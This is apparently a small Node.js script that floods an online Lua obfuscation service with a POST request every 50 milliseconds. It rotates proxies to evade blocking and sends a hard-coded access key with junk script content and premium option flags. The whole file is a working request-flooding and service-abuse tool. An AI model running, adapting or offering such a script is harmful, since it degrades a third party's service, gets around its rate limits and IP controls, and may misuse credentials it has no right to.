const axios = require('axios')
const proxy = require('./proxies.js')
const HttpsProxyAgent = require("https-proxy-agent")
let i = 0
setInterval(() => {

  try{
    const httpsAgent = new HttpsProxyAgent(proxy())
    axios.create({ httpsAgent }).request({
        url: 'https://psu.exposed/obfuscate',
        method: 'POST',
        data: {
          script: "print('e')\n".repeat(100),
          key: "kfcobfuscator",
          options: {
              DisableSuperOperators: true,
              MaximumSecurityEnabled: true,
              EncryptAllStrings: true,
              DisableAllMacros: true,
              EnhancedOutput: true,
              CompressedOutput: true,
              PremiumFormat: true,
              ByteCodeMode: "Default"
          }
        }
      }).then(d => {
        console.log("Weenie")
      })
      .catch(e =>{
        console.log("No eze ",e.response || "No res")
      })
    }catch(e){
      console.log("Big boi error :sob:")
    }
}, 50)
